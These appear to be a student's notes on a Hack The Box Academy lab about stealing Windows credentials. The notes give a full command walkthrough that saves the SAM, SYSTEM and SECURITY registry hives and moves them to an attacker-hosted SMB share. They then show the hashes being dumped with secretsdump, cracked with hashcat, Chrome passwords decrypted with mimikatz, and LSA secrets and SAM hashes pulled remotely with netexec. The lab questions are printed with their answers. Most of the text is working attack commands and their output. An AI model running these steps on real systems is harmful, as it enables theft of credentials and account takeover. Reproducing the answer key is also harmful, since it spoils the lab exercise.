# Attacking SAM, SYSTEM, and SECURITY
With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline. 

## Registry hives
There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes. 

<table class="table table-striped text-left">
<thead>
<tr>
<th>Registry Hive</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>HKLM\SAM</code></td>
<td>Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.</td>
</tr>
<tr>
<td><code>HKLM\SYSTEM</code></td>
<td>Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.</td>
</tr>
<tr>
<td><code>HKLM\SECURITY</code></td>
<td>Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.</td>
</tr>
</tbody>
</table>

### Using reg.exe to copy registry hives
By launching `cmd.exe` with administrative privileges, we can use `reg.exe` to save copies of the registry hives. 

```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

If we're only interested in dumping the hashes of local users, we need only **HKLM\SAM** and **HKLM\SYSTEM**. However, it's often useful to save **HKLM\SECURITY** as well, since it can contain cached domain user credentials on domain-joined systems, along with other valuable data. Next we'll use Impacket's [smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) to move the hive copies to a share hosted on our attacker machine.

### Creating a share with smbserver
We simply run `smbserver.py -smb2support`, specify a name for the share (e.g., `CompData`), and point to the local directory on our attack host where the hive copies will be stored (e.g., `/home/ltnbob/Documents`). The `-smb2support` flag ensures compatibility with newer versions of SMB. 

```sh
masterofblafu@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Once the share is running on our attack host, we can use the `move` command on the Windows target to transfer the hive copies to the share.

### Moving hive copies to share

```cmd
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

## Dumping hashes with secretsdump

```sh
masterofblafu@htb[/htb]$ locate secretsdump 
/usr/share/doc/python3-impacket/examples/secretsdump.py
masterofblafu@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM 
 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
[*] Cleaning up... 
```

Here we see that **secretsdump** successfully dumped the **local** SAM hashes, along with data from **hklm\security**, including cached domain logon information and LSA secrets such as the machine and user keys for DPAPI.

Notice that the first step **secretsdump** performs is retrieving the **system bootkey** before proceeding to dump the **local SAM hashes**. This is necessary because the bootkey is used to encrypt and decrypt the SAM database. Without it, the hashes cannot be decrypted — which is why having copies of the relevant registry hives, as discussed earlier, is crucial.

Moving on, notice the following line:

```sh
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

This tells us how to interpret the output and which hashes we can attempt to crack. Most modern Windows operating systems store passwords as **NT hashes**. Older systems (such as those prior to Windows Vista and Windows Server 2008) may store passwords as **LM hashes**, which are weaker and easier to crack.

With this in mind, we can copy the NT hashes associated with each user account into a text file and begin cracking passwords.

## Cracking hashes with Hashcat
### Running Hashcat against NT hashes
We will focus on using the `-m` option to specify hash type `1000`, which corresponds to NT hashes (also known as NTLM-based hashes).

```sh
masterofblafu@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: dumpedhashes.txt
Time.Started.....: Tue Dec 14 14:16:56 2021 (0 secs)
Time.Estimated...: Tue Dec 14 14:16:56 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 5/5 (100.00%) Digests
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: newzealand -> whitetiger

Started: Tue Dec 14 14:16:50 2021
Stopped: Tue Dec 14 14:16:58 2021
```

## DCC2 hashes
As mentioned previously, **hklm\security** contains cached domain logon information, specifically in the form of **DCC2 hashes**. These are local, hashed copies of network credential hashes. An example is:

```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

This type of hash is much more difficult to crack than an NT hash, as it uses PBKDF2. Additionally, it cannot be used for lateral movement with techniques like Pass-the-Hash (which we will cover later). The Hashcat mode for cracking DCC2 hashes is `2100`.

```sh
masterofblafu@htb[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt

<SNIP>

$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25:ihatepasswords
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 2100 (Domain Cached Credentials 2 (DCC2), MS Cache 2)
Hash.Target......: $DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
Time.Started.....: Tue Apr 22 09:12:53 2025 (27 secs)
Time.Estimated...: Tue Apr 22 09:13:20 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5536 H/s (8.70ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 149504/14344385 (1.04%)
Rejected.........: 0/149504 (0.00%)
Restore.Point....: 148992/14344385 (1.04%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9216-10239
Candidate.Engine.: Device Generator
Candidates.#1....: ilovelloyd -> gerber1
Hardware.Mon.#1..: Util: 95%

Started: Tue Apr 22 09:12:33 2025
Stopped: Tue Apr 22 09:13:22 2025
```

## DPAPI
In addition to the DCC2 hashes, we previously saw that the machine and user keys for DPAPI were also dumped from **hklm\security**. The Data Protection Application Programming Interface, or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection), is a set of APIs in Windows operating systems used to encrypt and decrypt data blobs on a per-user basis. These blobs are utilized by various Windows OS features and third-party applications. Below are just a few examples of applications that use DPAPI and how they use it:

<table class="table table-striped text-left">
<thead>
<tr>
<th>Applications</th>
<th>Use of DPAPI</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Internet Explorer</code></td>
<td>Password form auto-completion data (username and password for saved sites).</td>
</tr>
<tr>
<td><code>Google Chrome</code></td>
<td>Password form auto-completion data (username and password for saved sites).</td>
</tr>
<tr>
<td><code>Outlook</code></td>
<td>Passwords for email accounts.</td>
</tr>
<tr>
<td><code>Remote Desktop Connection</code></td>
<td>Saved credentials for connections to remote machines.</td>
</tr>
<tr>
<td><code>Credential Manager</code></td>
<td>Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.</td>
</tr>
</tbody>
</table>

DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).

```cmd
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
 * using BCrypt with AES-256-GCM
Password: April2025!
```

## Remote dumping & LSA secrets considerations
With access to credentials that have **local administrator privileges**, it is also possible to target LSA secrets over the network. This may allow us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.

### Dumping LSA secrets remotely

```sh
masterofblafu@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
```

### Dumping SAM Remotely

```sh
masterofblafu@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
```

## Questions
RDP to **10.129.202.137** (ACADEMY-PWATTACKS-WIN10SAM) with user "**Bob**" and password "**HTB_@cademy_stdnt!**"
1.  Where is the SAM database located in the Windows registry? (Format: \*\*\*\*\\\*\*\*) **Answer: HKLM/SAM**
2.  Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer. **Answer: matrix**
   - `$ xfreerdp /u:Bob /p:HTB_@cademy_stdnt! /v:10.129.202.137` → RDP to the target machine with the given credential `Bob:HTB_@cademy_stdnt!`
   - Open CMD as administrator and copy the registry hives:
        ```cmd
        C:\Windows\system32>reg.exe save hklm\sam C:\sam.save                                                                  
        The operation completed successfully.                                                                                                                                                                                                           
        C:\Windows\system32>reg.exe save hklm\system C:\system.save
        The operation completed successfully.                                                                                                                                                                                                           
        C:\Windows\system32>reg.exe save hklm\security C:\security.save                                                         
        The operation completed successfully.
        ```
   - `$ smbserver.py -smb2support SAMDATA /home/htb-ac-1863259/Desktop/` → create a share with smbserver 
   - Move hive copies to share (`Ctrl + C` when the file is transmitted):
        ```cmd
        C:\> move sam.save \\10.10.15.16\SAMDATA
                1 file(s) moved.

        C:\> move security.save \\10.10.15.16\SAMDATA
                1 file(s) moved.

        C:\> move system.save \\10.10.15.16\SAMDATA
                1 file(s) moved.
        ```
   - Dump hashes with secretsdump → copy the NT hash of user `ITbackdoor` to `hash.txt`:
        ```sh
        $ secretsdump.py -sam Desktop/sam.save -security Desktop/security.save -system Desktop/system.save LOCAL
        Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

        [*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
        [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
        Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
        bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
        jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
        ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
        frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
        [*] Dumping cached domain logon information (domain/username:hash)
        [*] Dumping LSA Secrets
        [*] DPAPI_SYSTEM 
        dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
        dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
        [*] NL$KM 
        0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
        0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
        0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
        0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
        NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
        [*] _SC_gupdate 
        (Unknown User):Password123
        [*] Cleaning up...
        $ echo c02478537b9727d391bc80011c2e2321 > hash.txt
        ```
   - Crack the hash offline using hashcat → found password for user `ITbackdoor`:`matrix`
        ```sh
        $ sudo hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
        <SNIP>
        c02478537b9727d391bc80011c2e2321:matrix                   
                                                          
        Session..........: hashcat
        Status...........: Cracked
        Hash.Mode........: 1000 (NTLM)
        Hash.Target......: c02478537b9727d391bc80011c2e2321
        <SNIP>
        ```
3.  Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive) **Answer: frontdesk:Password123**
   - Dump LSA secrets remotely using netexec:
        ```sh
        $ netexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
        SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
        SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
        SMB         10.129.202.137  445    FRONTDESK01      [+] Dumping LSA secrets
        SMB         10.129.202.137  445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
        dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
        SMB         10.129.202.137  445    FRONTDESK01      NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
        SMB         10.129.202.137  445    FRONTDESK01      frontdesk:Password123
        SMB         10.129.202.137  445    FRONTDESK01      [+] Dumped 3 LSA secrets to /home/htb-ac-1863259/.nxc/logs/FRONTDESK01_10.129.202.137_2026-02-17_220632.secrets and /home/htb-ac-1863259/.nxc/logs/FRONTDESK01_10.129.202.137_2026-02-17_220632.cached
        ```